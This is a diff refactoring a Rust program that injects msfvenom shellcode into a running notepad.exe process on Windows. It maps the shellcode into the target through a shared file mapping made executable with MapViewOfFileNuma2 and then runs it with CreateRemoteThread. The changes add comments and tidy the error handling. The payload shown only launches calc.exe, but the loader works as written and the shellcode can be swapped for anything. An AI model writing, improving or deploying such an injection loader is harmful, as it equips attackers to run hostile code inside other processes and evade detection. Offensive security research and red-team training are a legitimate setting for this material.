@@ -2,38 +2,60 @@ use std::{
     mem::transmute,
     ptr::{copy_nonoverlapping, null},
 };
-use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use sysinfo::{
+    PidExt, ProcessExt, 
+    System, SystemExt
+};
+
+use windows::{
+    core::{Error, Result},
+    Win32::Foundation::{E_FAIL, CloseHandle},
+};
 use windows::Win32::{
     Foundation::INVALID_HANDLE_VALUE,
-    System::Threading::{CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE},
+    System::Threading::{
+        CreateRemoteThread, OpenProcess, 
+        WaitForSingleObject, INFINITE
+    },
     System::{
+        Threading::PROCESS_ALL_ACCESS,
         Memory::{
-            CreateFileMappingA, MapViewOfFile, MapViewOfFileNuma2, FILE_MAP_EXECUTE,
+            CreateFileMappingA, MapViewOfFile, 
+            MapViewOfFileNuma2, FILE_MAP_EXECUTE,
             FILE_MAP_WRITE, PAGE_EXECUTE_READWRITE,
         },
-        Threading::PROCESS_ALL_ACCESS,
     },
 };
 
-fn find_process(process_name: &str) -> Result<u32, String> {
+/// Finds a process by its executable name and retrieves its PID.
+///
+/// # Arguments
+///
+/// * `name` - The name of the process to search for (e.g., `"notepad.exe"`).
+///
+/// # Returns
+///
+/// * `Ok(u32)` - The PID of the found process.
+/// * `Err` - If the process is not found.
+fn find_process(name: &str) -> Result<u32> {
     let mut system = System::new_all();
     system.refresh_all();
 
-    let processes: Vec<_> = system
+    let processes = system
         .processes()
         .values()
-        .filter(|process| process.name().to_lowercase() == process_name)
-        .collect();
+        .filter(|process| process.name().to_lowercase() == name)
+        .collect::<Vec<_>>();
 
-    for process in processes {
-        println!("[i] {} process with PID found: {}", process_name, process.pid());
+    if let Some(process) = processes.into_iter().next() {
+        println!("[+] Process with PID found: {}", process.pid());
         return Ok(process.pid().as_u32());
     }
 
-    return Err(String::from("Error finding the PID of the mentioned process!"));
+    Err(Error::new(E_FAIL, "Error finding process PID".into()))
 }
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -58,16 +80,13 @@ fn main() {
     ];
 
     unsafe {
-        println!("[+] Creating a mapping file");
+        // Find the PID of the target process (notepad.exe)
+        let pid = find_process("notepad.exe")?;
 
-        let pid_process = find_process("notepad.exe").unwrap_or_else(|e| {
-            panic!("[!] find_process Failed With Error: {e}");
-        });
+        // Open a handle to the target process
+        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
 
-        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_process).unwrap_or_else(|e| {
-            panic!("[!] OpenProcess Failed With Error: {e}");
-        });
-
+        // Create a file mapping object (shared memory)
         let hfile = CreateFileMappingA(
             INVALID_HANDLE_VALUE,
             None,
@@ -75,11 +94,9 @@ fn main() {
             0,
             shellcode.len() as u32,
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateFileMappingA Failed With Error: {e}");
-        });
+        )?;
 
-        println!("[+] Mapping the file object");
+        // Map the file object into the current process address space
         let map_address = MapViewOfFile(
             hfile,
             FILE_MAP_WRITE | FILE_MAP_EXECUTE,
@@ -88,12 +105,17 @@ fn main() {
             shellcode.len(),
         );
 
-        println!("[+] Copying Shellcode to another process");
-        copy_nonoverlapping(shellcode.as_ptr() as _, map_address.Value, shellcode.len());
+        // Copy the shellcode into the mapped memory
+        copy_nonoverlapping(
+            shellcode.as_ptr().cast(),
+            map_address.Value,
+            shellcode.len(),
+        );
 
+        // Map the file object into the remote process's address space
         let p_map_address = MapViewOfFileNuma2(hfile, hprocess, 0, None, 0, 0, PAGE_EXECUTE_READWRITE.0, 0);
 
-        println!("[+] Running the thread!!");
+        // Create a remote thread in the target process to execute the shellcode
         let hthread = CreateRemoteThread(
             hprocess,
             Some(null()),
@@ -102,10 +124,11 @@ fn main() {
             Some(null()),
             0,
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateRemoteThread Failed With Error: {e}");
-        });
+        )?;
 
         WaitForSingleObject(hthread, INFINITE);
+        CloseHandle(hthread)?;
     }
+
+    Ok(())
 }
